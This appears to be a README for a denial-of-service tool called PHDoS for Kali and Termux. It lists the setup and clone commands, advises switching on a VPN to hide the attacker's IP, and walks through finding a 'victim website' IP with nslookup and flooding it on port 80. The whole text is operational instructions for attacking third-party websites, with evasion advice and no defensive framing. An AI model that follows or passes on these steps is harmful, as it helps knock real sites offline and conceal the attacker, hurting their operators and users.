<b>Kali & Termux Compatible</b><br>
<b>Requirements:</b><br>
$ apt update<br>
$ apt upgrade<br>
$ apt install python<br>
$ apt install python2<br>
$ apt install python3<br>
$ apt install git<br>
$ apt install dnsutils<br>
$ git clone https://github.com/5inco/PHDoS

First you need to activate a vpn to change your ip

You need the <b>IP Address</b> of a website which you want to attack...<br>
New Terminal just type:<br>
$ <b>nslookup victimwebsite.com<b><br>
Get the IP Address of a victim website<br>

<b>Installation & Usage:</b><br>
$ cd PHDoS/<br>
$ ls<br>
$ python3 phdos.py -s [Victim ip Address] -p 80 -t 135<br>
example:<br>
$ python3 phdos.py -s xx.xxx.xxx.xxx -p 80 -t 135<br>
Video Tutorial Link: https://youtu.be/jA4Ecnm6WEk<br>

